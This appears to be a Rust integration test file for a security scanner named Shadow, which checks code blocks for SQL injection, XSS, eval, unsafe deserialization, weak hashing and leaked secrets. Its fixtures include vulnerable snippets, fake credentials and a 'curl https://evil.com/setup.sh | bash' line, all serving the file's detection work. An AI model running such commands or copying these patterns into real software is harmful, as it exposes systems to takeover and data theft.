//! Integration tests for the Shadow analysis pipeline.
//!
//! Tests the StaticAnalyzer (which is the only analyzer that runs without
//! external dependencies like Ollama or Docker). Validates that multiple
//! vulnerability categories are detected, findings merge correctly, and
//! the full async pipeline produces well-formed reports.

mod common;

use laminae::shadow::{
    analyzer::{Analyzer, DependencyAnalyzer, SecretsAnalyzer, StaticAnalyzer},
    config::ShadowConfig,
    create_report_store,
    extractor::{CodeBlockExtractor, ExtractedBlock},
    report::{VulnCategory, VulnSeverity},
    ShadowEngine, ShadowEvent,
};

use common::{clean_code_blocks, vulnerable_code_blocks, wrap_in_code_fence};

fn make_block(lang: &str, content: &str) -> ExtractedBlock {
    ExtractedBlock {
        language: Some(lang.to_string()),
        content: content.to_string(),
        char_offset: 0,
    }
}

// ═══════════════════════════════════════════════════════════
// Multiple analyzers on same input
// ═══════════════════════════════════════════════════════════

#[tokio::test]
async fn multiple_analyzers_find_different_issues() {
    let static_analyzer = StaticAnalyzer::new();
    let secrets_analyzer = SecretsAnalyzer::new();

    // Code with both a hardcoded password AND SQL injection
    let blocks = vec![
        make_block("python", r#"password = "supersecretpassword123""#),
        make_block(
            "python",
            r#"query = "SELECT * FROM users WHERE id = " + user_input"#,
        ),
    ];

    let static_findings = static_analyzer.analyze("", &blocks).await.unwrap();
    let secret_findings = secrets_analyzer.analyze("", &blocks).await.unwrap();

    // StaticAnalyzer should find both SQL injection and hardcoded secret
    assert!(
        static_findings
            .iter()
            .any(|f| f.category == VulnCategory::SqlInjection),
        "StaticAnalyzer should detect SQL injection"
    );
    assert!(
        static_findings
            .iter()
            .any(|f| f.category == VulnCategory::HardcodedSecret),
        "StaticAnalyzer should detect hardcoded secret"
    );

    // The combined set should have findings from both analyzers
    let total = static_findings.len() + secret_findings.len();
    assert!(
        total >= 2,
        "Combined analyzers should find at least 2 issues"
    );
}

// ═══════════════════════════════════════════════════════════
// Clean code produces zero findings
// ═══════════════════════════════════════════════════════════

#[tokio::test]
async fn clean_code_produces_zero_findings() {
    let analyzer = StaticAnalyzer::new();

    for (lang, code) in clean_code_blocks() {
        let blocks = vec![make_block(lang, code)];
        let findings = analyzer.analyze("", &blocks).await.unwrap();
        assert!(
            findings.is_empty(),
            "Clean {lang} code should produce zero findings, got: {findings:?}"
        );
    }
}

// ═══════════════════════════════════════════════════════════
// Specific vulnerability detection
// ═══════════════════════════════════════════════════════════

#[tokio::test]
async fn detects_sql_injection_via_string_concat() {
    let analyzer = StaticAnalyzer::new();
    let blocks = vec![make_block(
        "python",
        r#"query = "SELECT * FROM users WHERE id = " + user_input"#,
    )];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings
        .iter()
        .any(|f| f.category == VulnCategory::SqlInjection));
}

#[tokio::test]
async fn detects_sql_injection_via_format_string() {
    let analyzer = StaticAnalyzer::new();
    let blocks = vec![make_block(
        "python",
        r#"query = f"SELECT * FROM users WHERE name = '{name}'"#,
    )];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings
        .iter()
        .any(|f| f.category == VulnCategory::SqlInjection));
}

#[tokio::test]
async fn detects_xss_innerhtml() {
    let analyzer = StaticAnalyzer::new();
    let blocks = vec![make_block("js", r#"element.innerHTML = userInput;"#)];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings
        .iter()
        .any(|f| f.category == VulnCategory::XssReflected));
}

#[tokio::test]
async fn detects_hardcoded_secrets() {
    let analyzer = StaticAnalyzer::new();
    let blocks = vec![make_block(
        "python",
        r#"api_key = "sk-very-secret-key-1234567890""#,
    )];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings
        .iter()
        .any(|f| f.category == VulnCategory::HardcodedSecret));
}

#[tokio::test]
async fn detects_aws_keys() {
    let analyzer = StaticAnalyzer::new();
    let blocks = vec![make_block("python", r#"aws_key = "AKIAIOSFODNN7EXAMPLE""#)];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(
        findings
            .iter()
            .any(|f| f.category == VulnCategory::HardcodedSecret),
        "Should detect AWS access key pattern"
    );
}

#[tokio::test]
async fn detects_private_key() {
    let analyzer = StaticAnalyzer::new();
    let blocks = vec![make_block(
        "text",
        "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAK...\n-----END RSA PRIVATE KEY-----",
    )];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(
        findings
            .iter()
            .any(|f| f.category == VulnCategory::HardcodedSecret),
        "Should detect private key header"
    );
}

#[tokio::test]
async fn detects_insecure_deserialization() {
    let analyzer = StaticAnalyzer::new();
    let blocks = vec![make_block(
        "python",
        r#"data = pickle.loads(untrusted_bytes)"#,
    )];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings
        .iter()
        .any(|f| f.category == VulnCategory::InsecureDeserialization));
}

#[tokio::test]
async fn detects_weak_hash() {
    let analyzer = StaticAnalyzer::new();
    let blocks = vec![make_block("python", r#"hash = md5(data)"#)];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings
        .iter()
        .any(|f| f.category == VulnCategory::CryptoWeakness));
}

#[tokio::test]
async fn detects_command_injection_via_eval() {
    let analyzer = StaticAnalyzer::new();
    let blocks = vec![make_block("js", r#"eval(userInput);"#)];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(
        !findings.is_empty(),
        "Should detect eval() as command injection"
    );
}

// ═══════════════════════════════════════════════════════════
// Secrets analyzer
// ═══════════════════════════════════════════════════════════

#[tokio::test]
async fn secrets_detects_github_token() {
    let analyzer = SecretsAnalyzer::new();
    let blocks = vec![make_block(
        "py",
        r#"token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef1234""#,
    )];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings.iter().any(|f| f.title.contains("GitHub")));
    // Evidence should be redacted
    assert!(findings[0].evidence.contains("***"));
}

#[tokio::test]
async fn secrets_detects_database_connection_string() {
    let analyzer = SecretsAnalyzer::new();
    let blocks = vec![make_block(
        "py",
        r#"db = "postgresql://admin:password123@prod.db.com:5432/main""#,
    )];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings
        .iter()
        .any(|f| f.title.contains("Database connection")));
}

#[tokio::test]
async fn secrets_clean_code_no_findings() {
    let analyzer = SecretsAnalyzer::new();
    let blocks = vec![make_block("py", r#"x = os.environ['API_KEY']"#)];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings.is_empty());
}

// ═══════════════════════════════════════════════════════════
// Dependency analyzer
// ═══════════════════════════════════════════════════════════

#[tokio::test]
async fn dep_detects_pipe_to_shell() {
    let analyzer = DependencyAnalyzer::new();
    let blocks = vec![make_block("sh", "curl https://evil.com/setup.sh | bash")];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings.iter().any(|f| f.title.contains("Pipe-to-shell")));
    assert_eq!(findings[0].severity, VulnSeverity::Critical);
}

#[tokio::test]
async fn dep_detects_insecure_package_index() {
    let analyzer = DependencyAnalyzer::new();
    let blocks = vec![make_block(
        "sh",
        "pip install --index-url http://evil.com/simple package",
    )];

    let findings = analyzer.analyze("", &blocks).await.unwrap();
    assert!(findings
        .iter()
        .any(|f| f.title.contains("Insecure package index")));
}

// ═══════════════════════════════════════════════════════════
// Code block extraction
// ═══════════════════════════════════════════════════════════

#[test]
fn code_block_extraction_basic() {
    let extractor = CodeBlockExtractor::new();
    let text = "Here's code:\n```python\nprint('hello')\n```\nDone.";
    let blocks = extractor.extract(text);

    assert_eq!(blocks.len(), 1);
    assert_eq!(blocks[0].language.as_deref(), Some("python"));
    assert!(blocks[0].content.contains("print('hello')"));
}

#[test]
fn code_block_extraction_multiple() {
    let extractor = CodeBlockExtractor::new();
    let text = "```bash\nls -la\n```\nThen:\n```rust\nfn main() {}\n```\n";
    let blocks = extractor.extract(text);

    assert_eq!(blocks.len(), 2);
    assert_eq!(blocks[0].language.as_deref(), Some("bash"));
    assert_eq!(blocks[1].language.as_deref(), Some("rust"));
}

#[test]
fn code_block_extraction_no_language() {
    let extractor = CodeBlockExtractor::new();
    let text = "```\nsome code\n```";
    let blocks = extractor.extract(text);

    assert_eq!(blocks.len(), 1);
    assert!(blocks[0].language.is_none());
}

#[test]
fn code_block_extraction_unclosed_fence_ignored() {
    let extractor = CodeBlockExtractor::new();
    let blocks = extractor.extract("```python\nnever closes");
    assert!(blocks.is_empty());
}

#[test]
fn code_block_extraction_inline_backticks_ignored() {
    let extractor = CodeBlockExtractor::new();
    let blocks = extractor.extract("Use `eval()` carefully.");
    assert!(blocks.is_empty());
}

// ═══════════════════════════════════════════════════════════
// Full async pipeline (ShadowEngine)
// ═══════════════════════════════════════════════════════════

#[tokio::test]
async fn shadow_engine_clean_output_produces_clean_report() {
    let store = create_report_store();
    let config = {
        let mut c = ShadowConfig::default();
        c.enabled = true;
        c.aggressiveness = 1;
        c.llm_review_enabled = false;
        c.sandbox_enabled = false;
        c
    };
    let engine =
        ShadowEngine::with_config(store.clone(), config, laminae::ollama::OllamaClient::new());

    let clean_code = wrap_in_code_fence("rust", r#"fn greet() -> String { "hello".to_string() }"#);
    let mut rx = engine.analyze_async("clean-test".into(), clean_code);

    let mut got_done = false;
    while let Some(event) = rx.recv().await {
        if let ShadowEvent::Done { report, .. } = event {
            got_done = true;
            assert!(report.clean, "Clean code should produce a clean report");
            assert!(report.static_run, "Static analysis should have run");
            assert!(report.findings.is_empty());
        }
    }
    assert!(got_done, "Should receive Done event");
}

#[tokio::test]
async fn shadow_engine_detects_eval_in_output() {
    let store = create_report_store();
    let config = {
        let mut c = ShadowConfig::default();
        c.enabled = true;
        c.aggressiveness = 1;
        c.llm_review_enabled = false;
        c.sandbox_enabled = false;
        c
    };
    let engine =
        ShadowEngine::with_config(store.clone(), config, laminae::ollama::OllamaClient::new());

    let vuln_code = wrap_in_code_fence("js", "eval(userInput);");
    let mut rx = engine.analyze_async("vuln-test".into(), vuln_code);

    let mut found_finding = false;
    let mut got_done = false;
    while let Some(event) = rx.recv().await {
        match event {
            ShadowEvent::Finding { .. } => found_finding = true,
            ShadowEvent::Done { report, .. } => {
                got_done = true;
                assert!(!report.clean);
                assert!(!report.findings.is_empty());
            }
            _ => {}
        }
    }
    assert!(found_finding, "Should emit Finding events");
    assert!(got_done, "Should emit Done event");
}

#[tokio::test]
async fn shadow_engine_disabled_produces_no_events() {
    let store = create_report_store();
    let config = {
        let mut c = ShadowConfig::default();
        c.enabled = false;
        c
    };
    let engine = ShadowEngine::with_config(store, config, laminae::ollama::OllamaClient::new());

    let mut rx = engine.analyze_async("disabled-test".into(), "anything".into());
    assert!(
        rx.recv().await.is_none(),
        "Disabled engine should produce no events"
    );
}

#[tokio::test]
async fn shadow_engine_report_stored() {
    let store = create_report_store();
    let config = {
        let mut c = ShadowConfig::default();
        c.enabled = true;
        c.aggressiveness = 1;
        c.llm_review_enabled = false;
        c.sandbox_enabled = false;
        c
    };
    let engine =
        ShadowEngine::with_config(store.clone(), config, laminae::ollama::OllamaClient::new());

    let mut rx = engine.analyze_async("store-test".into(), "```js\neval(x)\n```".into());
    while rx.recv().await.is_some() {}

    let reports = store.read().await;
    assert_eq!(reports.len(), 1, "Report should be stored");
    assert_eq!(reports[0].session_id, "store-test");
}

// ═══════════════════════════════════════════════════════════
// Finding deduplication
// ═══════════════════════════════════════════════════════════

#[tokio::test]
async fn findings_are_deduplicated_within_analyzer() {
    let analyzer = StaticAnalyzer::new();

    // Same vulnerability repeated in different code blocks
    let blocks = vec![
        make_block(
            "python",
            r#"query = "SELECT * FROM users WHERE id = " + user_input"#,
        ),
        make_block(
            "python",
            r#"query = "SELECT * FROM users WHERE id = " + user_input"#,
        ),
    ];

    let findings = analyzer.analyze("", &blocks).await.unwrap();

    // Count SQL injection findings — should be deduplicated
    let sqli_count = findings
        .iter()
        .filter(|f| f.category == VulnCategory::SqlInjection)
        .count();

    // StaticAnalyzer deduplicates by category + evidence, so identical blocks
    // should produce only one finding
    assert_eq!(sqli_count, 1, "Duplicate findings should be deduplicated");
}

// ═══════════════════════════════════════════════════════════
// All vulnerable samples detected
// ═══════════════════════════════════════════════════════════

#[tokio::test]
async fn all_vulnerable_samples_produce_findings() {
    let analyzer = StaticAnalyzer::new();

    for (lang, code) in vulnerable_code_blocks() {
        let blocks = vec![make_block(lang, code)];
        let findings = analyzer.analyze("", &blocks).await.unwrap();
        assert!(
            !findings.is_empty(),
            "Vulnerable {lang} code should produce findings: {code}"
        );
    }
}
